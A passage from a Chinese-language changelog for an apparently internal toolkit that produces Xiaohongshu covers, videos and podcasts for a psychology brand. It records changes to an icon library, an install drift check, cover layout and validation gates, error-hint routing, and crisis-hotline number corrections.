icon set」且**没有「仅限出售」的限定语**，而本目录正是把整包随公开仓库分发——与当初否掉 unDraw（禁 redistribute in packs）是同一形状；`svg-find` 对 `ri` 的请求**明确报「故意没入库＋原因＋加库命令」**，⛔ 不让人以为「没有这个图标」。`render_cover` 的图标闸门**一行没改也没松**：它是 `SVG_LIB.glob('*.svg')`（平铺不递归），集合放在 `collections/<前缀>/` 子目录＝那道 glob 根本看不见，三万多枚一枚都没被自动放行，要用必须显式落地成平铺文件。`svg-find` 纯离线（六集合全量 json.load 实测 28ms，故没做索引层——测完发现是过度设计），每条**打印许可证**（台账不逐条记，那就在用的时候逐条显示），族别**逐图标判不按集合判**（tabler 里有 1088 个纯填充件，按集合一刀切会把填充图当同族推出去），中文映射 374 词、缺词**明说「没有中文映射，试试英文」⛔ 不静默返回空**。⚠️ 如实说：老板那句「使用的时候直接现搜索」目前只做到「本地三万多枚里现搜」，**没做联网现搜**（要做得先定「现搜到的图怎么过许可证这关」），测试断言 `--help` 里不出现 `--online`/`--fetch`，防以后有人加个假的
- **`./install.sh --check` 安装漂移检查**：`copy_to` 是 `rm -rf` + `cp -R`——谁直接改了安装副本，下次任何人跑一次安装就无声销毁；当天光两条线就各自往安装副本里写过东西，且因「改完真源≠生效」让另一条线拿旧副本做能力探测、得出了错误的进度判断。`--check` 只比对不写盘、正常安装前自动跑，**只有「副本被本地改过」才中止**（要覆盖加 `--force`）；⛔ **「真源更新」不能中止**——那是安装的正常理由，拦它就成了恒红闸门。三级判据逐级变软、每条结论在输出里带自己的证据：①mtime 晚于 marker `installed_at`（初筛，便宜；`cp -R` 不保留 mtime 故成立，且必须整数秒 floor＋严格大于，否则 cp 与 write_marker 落在同一秒会刚装完就全红）②副本内容命中真源任一历史 blob ⇒ 是旧同步、安全（充分不必要）③副本无「真源没有的行」⇒ 真源已含其全部内容、覆盖无损失（比②软，只在②查不到时用）。**判不出就说判不出**（marker 缺失／非 git／浅克隆／二进制文件各有专门文案）⛔ 不归到安全侧。上线当场抓到两处真实失同步，均非演习；忽略 `__pycache__` 有硬证据（pyc mtime 必然晚于 installed_at，不忽略则每次安装都被自己拦住），忽略清单明写在输出末尾不藏
- **小红书封面文档补五处「照着做不下去」的缺口**（**零上下文干跑**抓出来的，本条全部是**现状登记与订正**、⛔ 不是新规矩——代码早就这么跑了，只是文档没写或写错）：
  - 🔴 **横版视频封面在两份文档里零字，而代码有整套行为**：干跑实测 `--canvas`／横版／`landscape`／`1920` 在 SKILL.md 与 illustration-spec.md **全部零命中**（唯二的"横版"是 AI 生图负面提示里的「不要横版」，反而误导）。§2-c 新增「**横版画布（视频封面）**」：判据是 **`w > h`**（不是平台、不是画幅名），横版**豁免 `avatar`/`identity` 且第 ④ 层整层收起**、`footer` 与 hero 行数上限照判，`exempted`／`landscape_layer4_hidden`／`content_center_pct` 三个字段各说什么逐条写清——🔴 **`exempted` 与 `landscape_layer4_hidden` ⛔ 不能互相顶替**（一个说「闸门放了行」，一个说「版面真收了」）。同时把**最容易撞的一处**写进三个地方（③-1 排版步、③-1 比例收尾、衔接下一级）：**本 skill 这条线的视频/播客封面是 3:4 竖版 1080×1440，⛔ 别看到"视频封面"就传 `--canvas 16:9`**——横版是公众号/视频号那条线的画布，在小红书这条线上传它 = 头像层被吃掉 + 出一张信息流放不下的宽图
  - 🔴 **`gates_ok` 在两份文档里零命中，而退出码会骗人**：实跑复核——**缺头像那张（`gates_ok:false`）与全绿那张，退出码都是 0**，且 jinjin 这条路 `ok` 也恒 `true`（与 `gates_ok` 不同源，写 `if payload["ok"]` 会把红灯渲染当成功收下）。**验收判 `gates_ok`，⛔ 不判退出码、⛔ 不判 `ok`**，写进 §2-c 验收闸开头、SKILL.md 验收步、红线速记 16；**恒 0 是有意的**（小红书线现有用法＝照常出图、红字交人判断）⛔ 别去"修"它。顺带记进「两个假闸门」那节当第三条同族形状：**报在没人读的字段上，等于没量**
  - 🔴 **黄金范例与 `cover.json` 之间此前没有任何映射**，干跑代理在排版步真的卡住（「两条 `[support]` 哪条进 `subtitle`、哪条进 `steps`？`[detail]` 是 `footer` 还是 detail 档？」），且**全套文档 + 范例里 `"steps"` 零命中——没有一份完整的 `cover.json` 示例**（唯一那份躲在脚本 docstring 里，而文档从没让人去读那儿）。补三样：**`[层]` ↔ 字段映射表**（判据按**内容**不按行序：装完整金句原话的那条 `[support]` 才是 `subtitle`）、**一份照在产文件抄的完整 `cover.json`**（`cover-newflow/cover-liaochuangshang.json`，能直接跑）、映射表**同时补进黄金范例的 P1 块**（放在 `**页面文字**` 之前的 `>` 块里——放后面会被 `count_xhs.py` 计进该页密度；改完复跑，逐页字数与结构闸门 `gates` 与改前逐项相同）
  - ⚠️ **顺手订正数据契约表三行**（实跑复核，都是文档与代码对不上）：`steps` 标着「✅必填三条、缺了报红」，实测**压根不校验**（整份不传照样 `gates_ok:true`）、**结论行判据是「最后一条」不是「第三条」**（模板 `i === steps.length - 1`）、**在产 5 份 JSON 全是 2 条**；`ornament` 标着「必须是 `assets/svg-library/` 里的」，实测认的是**模板内置 ORN 库**（`plant-support`/`sprout`/`cup`/`stone`/`none`），svg-library 那个库是 still-life 的 `icons` 才读的，只有走 `ornament_svg` 传外部文件才查 `LICENSES.md` 台账（同一说法在验收闸第 5 条与红线速记 16 里各有一份，**三处一起改**）；`avatar`/`identity` 补上「**只在竖版校验**」。另补 `template`/`canvas`/`theme` 三个契约字段与**整张命令行参数表**（`--out`/`--template`/`--canvas`/`--thumb`/`--html-only` 此前只有 `--help` 看得到）
  - ⚠️ **订正一条会误判的判据**：「P1 块的文字 ≡ `cover.json` 的 `hero + subtitle + steps` 逐字比」——**`footer` 漏在等式外**，而黄金范例的 `[detail]「NBDpsy 心理科普」` 走的就是 `footer`，照原等式比必然对不上、把「其实没改」误判成「改了没回写」。改成 **`hero + subtitle + steps + footer`**，并写明 `avatar`/`identity` 属元素层不进等式
  - 📌 **「封面文案步派单留痕」补上格式与范例**：此前全仓只有一处提到这个块名，没格式没范例（而隔壁「封面改文案留痕」有完整三列模板，审查端 `checklist-note.md` 又确实在 grep 这个块名）。补「**块名 + 一行元信息 + prompt 原文围栏 + 一行自证**」四段式与真实范例，写死**贴原文 ⛔ 不许摘要**（写「已按规范派单、未含量具」＝把要被核的事换成自查结论，红线 18）、**追发消息与共享文件里的量具一并贴**
  - ✅ **停止催一笔从来不存在的欠账**：SKILL.md 写「④ 的版式白名单**目前是四个**……白名单进代码是**欠账**……并催脚本层补白名单」，实查 `publish_note.py:272::COVER_LAYOUTS` **是五个**（通栏大字压顶/左字右图分栏/留白场/色块压条/**上图下字·真人照**）。🔴 **`git log -S "上图下字·真人照"` 核实：第五式是 `c0b38d6`（2026-08-14，就是把闸门 A 代码化的那一笔）带进来的——代码从落地当天起就是五个，从来没有过"四个"的版本**，那句欠账**从写下那天起就不成立**（不是"后来过期了"，是**写的时候没去数一遍代码**）。⇒ 顺带把教训写上墙：**文档里写"代码还差 X"这类话，落笔前必须实查一次并注明查的日期**。另补：校验四项那段**漏列了第五个版式名**，一并补齐。（`style-gallery/cover/` 仍只有前四种的样图——那是另一件事、实查仍成立，不动）
  - **闸门 A 的 `source` 从两档变三档，四处措辞跟上**：`COVER_SOURCES` 已增 **`render_cover`** 档（HTML 确定性渲染＝封面主路径），于是旧措辞「**⛔ 自渲染 HTML 不是合法来源**」会把主路径读成非法。**逐处改准**（凭证样例注释 `// 只认 gen_images | manual_confirmed`、校验六项 ②③④、`manual_confirmed` 那条警告、拦得住/拦不住表、凭证落盘小节、红线速记 10——**共 6 处**）：判据是「**走没走 `render_cover.py` 那条产线**」，⛔ **不是「用没用 HTML」**；**手搓的 HTML 仍然是伪造凭证**。并写清这一档的**校验按来源分岔**：⛔ 不要 `job_id`/`session_id`（本地渲染没有 server job）、⛔ 不要 `prompt_excerpt`（确定性渲染压根没提示词），改判 **`template` + `palette`（记的是实际渲出来的色值）+ `layout`** 三个确定性字段
  - 🔴 **但这条链实测还没接通，已如实登记进文档、⛔ 没写成"现在可以了"**：闸门侧判据齐全，**而 `render_cover.py` 自己落的 `.meta.json` 缺 `source`/`layout`/`palette`/`style_profile`/`cover_only` 五个字段**——拿刚渲好的封面直接 `--check-cover`，当场报「缺字段 `source`」。**手工补上这五个字段后闸门当场通过**（实测跑通，返回 `layout`/`palette`/`render_gates_ok`），**说明缺的只是这五个字段、判据本身没问题**。由谁补（渲染器自己写／排版步手写／调用方补）**尚未定**——文档写成**待办**，并明写 ⛔ **别为了过闸把 `source` 写成 `gen_images` 或 `manual_confirmed`**（`render_cover` 档存在的意义正是不必再撒这个谎）
  - **补上 `gates_ok` 在发布端的口径**：`--check-cover` 读到 `gates_ok` 不是 `true` 时**照样放行**（现行用法＝照常出图、红字交人判断），但会往 stderr 打一条显眼 ⚠️🔴 并列出全部 🔴 原文；判据是 **`is not True`**（缺字段/`null` 一样出声，⛔ 不给"字段没有＝当它绿"留口子）。⇒ 文档写死：**`gates_ok` 归 验收步 判，发布端只提醒、不替你拦**；看到那条 ⚠️ 而你并没看过图，就是验收步没做完
  - 🔴 **字高表重标定：删表 1、给表 2 补溯源、并当场推翻了两条已写下的结论**：
    ①**删表 1**（4字12.4/5字9.9/6字8.3/7字7.1/8字6.2/10字5.0）——它按「字高＝字号×0.86」**推算**，而实测中文 900 字重墨迹比是 **0.955–0.982**，全线偏低约 11%。⛔ **不换数、直接删**：留着换个数，下一个人会当它是另一套独立实测，又两张表打架。原位留了删除留痕。
    ②**表 2 保留并补溯源**——入库那笔（`25704d6`）**没记测试句与数据形态**，我用渲染器**倒推复现**出来了：形态＝竖版 876×1313＋avatar/identity/footer、**hero 单行无 steps**；拿「这真的不是玻璃心啊呀」逐字截取重跑，**3/6/7/9 字四档与表 2 逐位相同**，4/5/8 字差 ≤0.08pp（句子不同、字宽不同）。并立**读表纪律**：「这张表读的是同一句话在不同字数下的**量级与拐点**，⛔ 不是『N 字必得 X%』」。
    ③🔴 **实测推翻「≤4 字 → 冲破上限 13%」**：`114422d` 把 `HERO_MAX` 从 `H*0.13/0.86` 改成**在真实字号上二分实测墨迹**求解，`inkAt(HERO_MAX) ≤ 0.13H` **由构造成立** ⇒ 夹取处字高**恒 ≤13.00%**。当前实测 3/4 字**恒 12.95%、不再冲破、也不再报告警**（`hero_max=177 × hero_ink_ratio 0.97 → 170px`）。**表 2 那两格 14.39/13.71 是旧引擎的数、已复现不出来**——⛔ 也**没有**改成新测的 12.95（那是第三个来源，覆盖只会把"两张表打架"变成"三代数据打架"），改成**标注失效 + 写清机制**。
    ④⚠️ **顺带发现一个真缺口**：上限告警失效后，**「hero 太短」在竖版不再有任何量具替你发现**（横版有 `hero_fill_pct`，竖版没有等价物）；它现在的表现是**字号顶死在 `hero_max`**、加字减字只改占宽不改字高。已如实登记为**已知缺口**，⛔ 没写成"闸门还管着"。
    ⑤**同批清掉两处随之失效的旧话**：`hero_glyph_band_canvas` 字段**已从模板移除**（横版 15.5% 那条分岔上限随根因修复一并取消，两画幅回到同一条 13%），文档里读它的地方会 `KeyError`；`SKILL.md` 照抄的那段上限告警原文（「从原金句里多留两个字、让字号自然落回甜区」）**已被代码删除**（它描述的是不会再发生的场景），改成留痕 + 新含义。
    📌 **另立一条形状**：一条闸门在某个画幅上**恒报红**，第一反应不该是「给这个画幅单开一条阈值」，而该问「**是不是阈值本身算错了**」——分岔那一版把根因藏了整整一轮。
  - 📌 **这批（含上面五条）的共同点值得单记一句**：它们**不是"文档写得不好"，是"文档描述的那个世界已经不存在了"**——欠账还完了（且本就没欠）、来源多了一档、报错换了词、白名单长了一个。**文档描述现状时，现状会自己往前走**；所以凡是「代码目前是 N 个／目前还不支持 X／这是个欠账」这类**指向代码当下状态**的句子，都得当**易腐句**对待：写的时候实查 + 注明日期，读的时候先复查一遍再照做


## [2.1.2] — 2026-08-17

- **出图失败的 hint 按错误类型分流**（服务号线 15:10 撞 429 实证）：此前无论什么错都说「调提示词后重跑」，而额度耗尽时照做只会反复撞 429 而不去充值。现在分四路：**额度耗尽→说充值+入口+「调提示词无用」**｜**限流→等几分钟原样重跑、别改提示词**｜**内容策略拒绝→这一条才改提示词**｜未知→保持原通用建议。批量路径同样生效。
  判据（值得复用）：**hint 的职责是「告诉人下一步做什么」，所以它必须随错误类型变——不随错误变的 hint 比没有更坏**，它把人导向一条注定失败的路。
  测试 +5 条并变异证伪（拆掉分流三条翻红、未知错误那条保持绿＝反向守卫有效）；1330→1335


## [2.1.1] — 2026-08-17

**封面口径定案与实测数据入规格**（老板 14:35 批复 + 五张实渲扫描）：

- **封面文案＝金句不是标题**（老板原话「封面不仅仅是标题，应该是金句，可以 10～30 字…不一定需要多好看，但一定要金句才能提高 CTR」）。两层口径并存写清：**「金句 10–30 字」是内容层**（金句一字不少在封面上）、**「hero ≤6 字」是视觉层**（金句里最狠的片段放大），⛔ 别为守字高把金句砍成 4 字、也别把 30 字全塞进大字
- **「从原句截片段当 hero」不算改文案**（老板明确），标点可动
- 🆕 **hero 甜区＝5–6 字**（实测扫描 3–9 字全谱）：≥7 字跌破下限 9%、**≤4 字冲破上限 13%**（「通栏撑满」与「≤13%」在 4 字内不可兼得）——原规格只写了上界，下界补齐
- ⭐ **反直觉实测：hero 越短版面越挤**（hero 短→字号大→副题×0.34 跟着放大→吃掉更多垂直空间→递进行被压）；⛔ 纠正「文案长会压到头像」的说法——头像是固定 flex 项从不让步，被压顺序是**递进行→hero**
- **折行兜底上限**：金句 ≤37 字（3 行）安全、≥50 字开始削 hero；递进行每条 ≤56 字安全、9 行第一临界、15 行封面崩；**有副题时 hero 必须 1 行**
- 三条运营线实证入审查端：**先切成品区再做词面检查**（自查段与成品同文件时全文 grep 必失真，本仓三个机检脚本已正确切区、但手跑 grep 会误报）、**自查结论不许当审查输入且必附计数口径**、**免责 ≥3 处先质疑选题**


## [2.1.0] — 2026-08-17

**HTML 封面渲染转为主路径**（老板看完并排对比拍板「HTML 的更好」，AI 生图退为只画陪衬素材）：

- **新增 `scripts/render_cover.py` + `assets/cover-templates/tpl-cover-jinjin.html`**：数据驱动（JSON 传文案）、876×1313、复用 typeset_longimage 的 Playwright 截图范式。**改一句文案＝改一个字段，版式分毫不动、秒出、零出图额度、字绝不写错、同批天然同款**——AI 生图每次重出都会漂移，这是它治不了的病
- **四级字阶**（hero 赭红 Heavy ≥9% 画面高 / 副题 =hero×0.34 墨蓝加粗 / steps =hero×0.58 灰蓝 / 结论行赭红加粗）；`avatar_ratio` 0.36
- 🔴 **版式适用范围硬判据**（本轮最贵教训）：「通栏大字压顶」要求 **hero ≤6 字**——876px 画布实测 4 字＝12.4%、6 字＝8.3%、**10 字＝5.0%**。超 6 字只能**拆成 hero+副题**或**换版式**，⛔ 绝不硬压字号（首版就是这么把 hero 压到 5%、冲击力只剩 AI 版 45%）。**不是规格数字错，是文案与版式不匹配**
- **新增 `assets/svg-library/`**：63 个开源 SVG（Lucide ISC 56 / Tabler MIT 7 / 自绘 2），**全库零署名义务**，`LICENSES.md` 逐文件台账（来源/许可证/需否署名/日期）当免责依据；⛔ CC-BY 与 CC-BY-NC 一个没收；unDraw 因「禁止 redistribute in packs」而不收
- **四道静默缺口改报红**：ornament 名不在库（曾静默无图）、缺 avatar/identity/footer（曾留 19.3% 空白）、hero 超两行、字体未落位
- ⚠️ **两个「测了等于没测」的假闸门入规范**：`document.fonts.check()` **对任何字体名都返回 true**（实测 'Totally Fake Font XYZ' 亦然）；`scrollHeight <= clientHeight` 在 overflow:visible 的 flex 容器里**恒等**（首版靠它蒙混，加副题后实际溢出 70.8px 仍报绿）
- 规格与审查端：illustration-spec 新增 **§2-c**（与 §2-b 分工：一个管怎么排、一个管排什么）；SKILL.md 工序③ 与红线第 16 条；checklist-images 新增 **判据 6-c**（HTML 封面产物七项逐条可核）


## [2.0.0] — 2026-08-17

**三条写作方法论落成必经闸门**（老板令：「吸收进产线，要确保下次写小红书文案时能真的运用，而不是一个死链，永远闲置不被调用」）。⚠️ **Breaking**：所有笔记 frontmatter 新增必填 `读者` 字段，存量稿件不补即拒跑。

- **落点＝R4 结构闸门 `validate_structure()`**（出图必经、已证明有约束力），⛔ 不写进「参考资料」章节——那必然是死链。三条各成一道拒跑闸，凭证记 `gates:{reader,term,seller_view}` 供发布端与审查端核「这次到底走没走」：
  - **闸1 读者必填**（方法论③「下笔前先钉死读者是谁」）：`读者: 身份阶段（…）｜痛点（…）｜最容易误解或焦虑的点（…）`，三段缺一即拒、每段答案 ≥6 字、空泛值（所有人/大众/对心理感兴趣的人）拒
  - **闸2 术语必定义**（方法论①「术语只能定义或删除」）：18 个领域术语首现页无定义句式即拒，报错给判断句原话与两条出路；`--skip-term-gate` 默认关闭且留痕可追责
  - **闸3 禁卖方视角**（方法论②「读者不关心你提供什么」）：论点行与封面 hero 命中卖方腔即拒
- **零上下文干跑验收 + 四条缝当场补齐**（干跑结论：「拦住的是有没有做、不是做得对不对」，四缝均已实测溜过后修复并证伪）：
  ① 卖方闸从关键词表升级为**主语判据**（我方主语+供给动词同现即命中，挡住「本机构擅长…」「NBDpsy 的咨询师可以陪你…」这类同义替换）
  ② **论点行内容最低校验**（占位词/过短/纯名词短语拒跑）——兑现报错里一直写着的「名词短语不算」；⚠️ 判据用反向法（无标点+无虚词+≤10字才判），宁放勿伤，成色仍归审查端
  ③ 术语闸并扫**绘图提示词围栏里引号内的图内文字**（此前把术语全塞进围栏即可过闸，而那正是图上实际出现的字）
  ④ **故事线结构校验**（≥2 步推进，「故事线: 讲清楚解离」这类主题式写法拒跑）
- 规格与审查端同步：illustration-spec §1-b 三闸条文+速查、SKILL.md 工序②-0「先答读者三问再动笔」+红线第 15 条、checklist-note 判据 6-R4 扩到七项（含「读者三段式是否换篇也成立」这类代码判不出、必须人工的判据）
- 测试 1297→1330（+33），四缝逐条变异证伪；黄金范例按新闸修正（它原本两闸都不过——闸门有牙的最强证据）


## [1.99.0] — 2026-08-16

**八条事故实证落规格**（博客长文线补齐的反例档案，含 2026-08-13~16 全部现场）：

- **⑧ 视频/播客发布改写成「两段式四步」主路径**（最急）：发布 → `--fix-cover` 补封面 → `--recheck` 回读 → `--ledger-check` 闭台账，**四步都是常规工序不是异常处置**。根因＝设封面入口自上线 31/31 全败（xhs-server 2026-08-16 定性），skill 却把它写成主路径，于是每批多走一轮失败+补救、断会话补救即丢。同步写死**形态边界对照表**（图文没有封面通道、封面＝P01、传 `--cover` 直接拒、事后唯一补救＝删稿重发）
- **闸门 B 代码化**（此前只是文字约束）：`publish_note.py` 收到 `--video/--audio` 直接拒并指路 `publish_video.py`；图文误传 `--cover` 在 **dry-run 阶段**就拦（此前预检绿灯、真发才红，且台账留一条无 job 号、任何补救都不适用的死行）。均配测试+拆闸证伪
- **④ hero 判据从三问扩为四判据**：补①事实边界②自明性③**信息量下限**（七版打回里栽得最狠的一版：头像放大到 36% 但信息不足）＋「递进式版式装饰性序号＝负分」；主文档不再只写三问（此前只读 SKILL.md 的执行者会漏掉两条）
- **⑤ 密度按页型分档且各有下限**：封面 12–45 字（三层信息齐）／内容页 150–250 字（**<150 且三元组填不出＝FAIL**）／末页 40–90 字（三件齐）——此前只有上限，于是 25 页做成「标题的堆叠」
- **⑥ 实证句柄纪律**：报「某步已完成」必须同时给回执 job id／台账行／线上状态三选一，给不出只能报「进行中」；批次判据＝`--ledger-check` exit 0（exit 4＝没有证据，不是绿）
- **⑦ 存量清理全字段扫**：`to_jsonb` 整行 SQL（新增列自动纳入）＋前端硬编码 grep；「线上有、库里没有」第一嫌疑人是查询范围不是缓存（危机热线那次假绿的元凶列是 `faq`，会进 JSON-LD FAQPage 被 AI 引擎当官方答案抓走）
- 修干跑实测的三处会撞的坑：凭证 `cover_file` 改比主名不比扩展名（照文档转 JPG 必撞）、`--fix-cover` 命令补 `--ledger`（台账路径推导会漂到 cover/ 子目录导致补救号登记不进）、闸门 A 校验项数统一为六项


## [1.98.0] — 2026-08-16

**并行六线批次**（老板令「多工作流并行」后的第一批集中交付）：

- **tpl-oneline 一行字卡**（字卡家族第五版式，老板持抖音对标截图点名）：全屏纹理+手写体（站酷快乐体，OFL 类免费商用）黑字白描边、一屏一行绝不折行、口播句级同步；单行闸门=超上限拒渲染⛔绝不按行缩字；`--max-line-chars 8–14`（默认 12，书名场景 13——整片按安全区反推统一字号，13 过/14 拒实测）；背景两档（疗愈暖米白纸纹/科普冷白皱纸）双画幅（3:4/16:9）四条样片实测
- **声音链路修复+全形态声音 checklist**（老板实听「背景音太小」）：根因=整链无绝对响度归一（TTS 原始 −31.6 LUFS 比平台常态低 15dB）——新增两遍法母带归一到 −16 LUFS（`--master-lufs`）+BGM duck 默认 −18→−14；成片响度凭证全套进 meta（narration/bgm/master 实测链）；新建 `references/audio-checklist.md`（LUFS 不认 RMS/真峰≤−1.5/手机外放试听等）；H1 v2 实测 −16.01 LUFS/TP −1.50 正中目标
- **发布台账闭环三缺陷**（job 340 首航实证）：`--fix-cover` 成功后把补救任务号登记进台账行、`--recheck` 拿登记号回服务端核 `applied` 才作数（伪造号打不过真回读）；台账路径锚定媒体目录⛔cwd 写入/凭空新建（cwd 仅只读锚点）；台账行账号字段写账号名不写编号；29 条测试+6 条变异证伪+真号端到端（340 行已翻 [x]）
- **narration-spec 扩为十四律**：口播写作十条上墙版并入（写给耳朵不写给眼睛总纲/听觉版 hero/道理让场景说/收尾金句会转述）；§九 长度闸门定案「≤100 汉字唯一硬闸、25 秒降感知参考线」（实测语速页间差 20%，秒数不可控）；节号律号只追加不重排（外部三文件直引）
- **style-gallery 补基底两卡**（默认基底+四要素解剖卡，等宽色片⛔不发明配比）；README 来源声明两分（取帧类逐字未改/说明卡类逐字抄规格）
- 杂项：menu_ops 补 `menu/delete` 会连个性化菜单一起删的警示；slideshow-video-spec 25 秒表述与 narration-spec §九 同步；card-video-spec oneline 节补参数说明；危机声明标准句三处副本加「号码真源=checklist-article 判据10」指针


## [1.97.1] — 2026-08-16

- 轮播放映形态「可接单」标记开启（老板验收样式通过）；同步明确口播稿硬闸——必须过外置审校才准出正式片，机械扩写稿只配工程测试


## [1.97.0] — 2026-08-16

**重塑 P2：第四视频形态「轮播放映」产线建成 + 微电影/播客子风格上线**（老板 2026-08-16 拍板）：

- **「轮播放映」**（text-to-video 第四形态，⏳待老板验收样片后接单）：已产轮播图 PPT 式逐张放映+口播串联+BGM，3:4 竖版零裁切；每页时长=口播 wav 实长（域校验差 0.001s）；首版无字幕；唯一不新增画面成本的形态，边际≈¥0.54/条+本地渲染，首片实测 H1 九页 181.3s/4分10秒出片。`scripts/slideshow_video.py` 一条命令收口；上游闸门=轮播须 R4 达标（图讲不清口播救不回来）。规格 references/slideshow-video-spec.md
- **微电影子风格三档**（cinematic-direction「一之三」节）：暖雾（默认=历史全部成片现状）/沉静/晨光——同一套导演方法论，差异只在色板配比/转场/节奏；沉静档带「不做暖包围冷大反转」合规红线
- **播客播放器主题两档**：深夜电台（默认）/纸上对谈（暖纸底+墨色声纹），`record_podcast.py --theme` 真实切换（data-theme 驱动 CSS 变量，非纸面选项）
- 风格问询接线：creator 工序①-3 亮图表新增子风格追问行（默认档不硬逼选）+ style-gallery/video 新增 5 张档位卡与 2 张播放器真实渲染帧


## [1.96.2] — 2026-08-14

**危机声明热线安全修订**（服务号线一手查证驱动，内容安全级）：

- **「希望24热线 4001619995」从全部模板停用**：官网信息冻结于 2021、2023 年自述近半来电无法接通、2024 年至今零信息——「查不到停运公告」不能当「仍在服务」。新标准阵容：**12356**（全国统一号，⛔不得标「24小时」，官方口径每日≥18小时）+ **010-82951332** 北京心理危机研究与干预中心（唯一可标 24 小时）+ 110/120
- **机器闸门反转防回流**：preflight R8 此前**强制要求**正文必含 4001619995 才放行（按规矩写稿必写停用热线）——现改为四态判定，**含 4001619995/希望24（容错空格与连字符写法）即 FAIL**；check_compliance 同步加「停用热线」「热线时段误标」两条拦截（归属判定：只有挂在 12356 名下的「24小时」才算误标，标准长句不误伤），--no-crisis 不豁免错号码，两侧闸门对称实证
- **危机私信 SOP 订正**（xiaohongshu-spec §危机私信）：12356 去掉「24 小时」误标，补夜间备选 010-82951332，保留「不评估不诊断不承诺只转介」结构
- 波及 13 文件（3 spec/1 checklist/3 范例夹具/2 闸门脚本/2 测试/1 话术/1 评分白名单）；测试 1254→1263，两侧闸门均经证伪（禁用拦截看旧声明假绿再复红）
- ⚠️ 存量已发布内容（官网 pillar/博客/旧笔记/已发公众号文）仍带旧三条版，清理归属待老板拍板


## [1.96.1] — 2026-08-14

**fuwuhao-operator 两缺陷修复**（服务号线 2026-08-14 发稿实证，工单驱动）：

- **md2wechat.py 剥「## 配图」区块**：此前编译不剥提示词区块，按规格写稿→编译的正路会把 3000+ 字绘图提示词（色值/构图/负面提示）原样印进公众号正文；现按行首正则截断且**必出 warning**（含起始行号/字符数/围栏数，绝不静默剥），区块后仍有正文小节时点名行号告警
- **zh_review.py 根治静默半篇假绿**：读 finish_reason 检测截断（截断→点名「仅覆盖到某节」+ 结论降级 partial + **exit 2**，绝不静默 exit 0）；正文 >2500 汉字按小节分段逐段送审并标注每段覆盖范围；MAX_TOKENS 4000→8000（2265 汉字即撑爆 4000 是截断根因）；extract_body 的裸 split 同病同修。SKILL.md 2.7 步补 exit 2 语义（⛔ 不能当过闸门）
- 测试 1243→1254（+11 全为新增），两缺陷均经证伪（禁用修复看验收判据翻红）


## [1.96.0] — 2026-08-14

**小红书创作 skill 系统性重塑 P1（老板令）**——涉及 xiaohongshu-creator / text-to-video / content-reviewer / content-pipeline / guide 五包：

- **主线按六步工序重排**：选题拆分→文案→封面→对抗审查→发布→发布后，每步四件套（怎么做/工具/规范/对抗审查）；旧 0–7 步对号表保留，正文旧称呼可对号
- **三道结构闸门代码化**（三个实证事故的根治，文档+代码双落地）：①封面产出凭证 `cover-*.meta.json`（gen_images 自动落盘；单出确认语义 `cover_only`/`--confirm-cover --confirmed-by`，批量顺带产出的封面拒发）；②⛔无 job 直调（发布/编辑必经脚本层，新增 `scripts/publish_video.py`：视频线唯一脚本层，含 topics 拆分/凭证校验/终态白名单）；③发布台账记「意图 vs 实际」差集，差集非空 exit 3 不许报完成，`--ledger-check` 无台账 exit 4 不再冒充闭环
- **R4「图要把事讲清楚」**：论点行先行（每页提示词块首行必填，缺失 gen_images 拒跑）/图内自足/整组故事线（frontmatter 字段）/每页三元组；密度口径 B＝每页对标 400 字小文一节、图内 150–250 汉字（count_xhs 新增逐页密度报告模式）；版式序列填写时点后移到论点行之后
- **封面**：hero 三问自检（含 cover-notes-shilu.md 真实打回例句库入包）+条件头像闸门（拆解咨询师署名长文封面无其真人头像＝不过审）；三级字重系数化（主标题≈画面高 13%、副题×0.34、小字×0.22）替代 1.6× 旧口径；第五具名版式「上图下字·真人照」按 12/12 生产实证收编
- **风格系统**：`assets/style-gallery/` 示例库（封面四版式/文字版两主题/视频六形态取帧，732KB）+开工问询主动亮图；风格档案回读改「按上次这套照旧吗」征询式（guide 同步）
- 审查端两张 checklist 同步 R4 判据与新口径；黄金范例重写为 R4 合规（旧版是无论点行的反面教材）；canceled 拼写统一（一个 l）；播客 spec「封面首帧」旁路删除；发布后补封面已实证可用（--fix-cover，仅视频）
- 测试 1243 passed；三道闸门均经证伪验证（摘掉校验看对应测例翻红再复绿）


## [1.95.0] — 2026-08-13

### Added（nbdpsy-text-to-video：屏显文字排版铁律，老板令·全形态统一）

- **narration-spec §七（正典）**：①逗号（，、；）=换行 ②句号/问号/省略号=翻页（硬切，退而求其次空两行）③每完整句独立成页/成段 ⛔ 多句同屏连排。细则全部来自 EMDR 线量具实裁（R23/R32/R32-b/R32-c/R36）：最短页 1.2s 链式并页（⚠️「语料没有亚秒句」被 16 个实例打脸——「语料没有 X」必须普查后才可入规）、逗号段按语音进度渐显、卡高自适应生长禁预留空白、翻页背景空窗 ≤0.15s 禁黑场频闪、豁免登记制（清单卡/静默卡/老板验收过的专用动效语言）。
- **统一收口铁律**（R36 事故直译）：任何文字渲染路径（新增模板/动效语言/词级路径）必须过同一排版规则集——事故=同一模板三条分页路径各行其是、kinetic/phrase 行绕过排版规则逗号全挤一行，老板全片验收当场抓到（原话「这个问题不应该再出现」）；验收=全卡机器扫描逐页核对，⛔ 抽样。
- card-video-spec 挂本形态豁免登记（kinetic 逐词砸屏仅限砸屏主体，其余文字走铁律）；podcast-video-spec 原「字幕规则与短视频一致」升格并指向正典；SKILL.md 字幕节挂指针。

## [1.94.0] — 2026-08-12

### Added（nbdpsy-text-to-video + nbdpsy-xiaohongshu-creator：品牌矢量 logo 资产入包）

- 两个出图/出片 skill 各内置 `assets/brand/`：**6 个矢量 SVG logo 变体**（全标/徽记×渐变金/纯金/单色酒红/单色金/反白）+ `brand-logo.md`（色值、深底规则、最小尺寸、安全空间、取用方式）。由 2816px 原始位图 potrace 描摹（徽记 8 条贝塞尔复合路径），任意分辨率无损；**此后片头/收尾/水印/合成一律取矢量，禁止再用 JPEG logo 抠图**。
- 矢量真源与印刷格式（PDF/EPS+完整规格）在主仓 `NBDpsy/frontend/marketing-web/public/brand/`，公网 `https://www.nbdpsy.com/brand/svg/*.svg` 可直取。
- nbdpsy-guide 无需同步：纯内部资产，不新增运营入口/触发语。

## [1.93.2] — 2026-08-12

### Fixed（nbdpsy-text-to-video：分片提速数字勘误 + 存量一致性哈希实证）

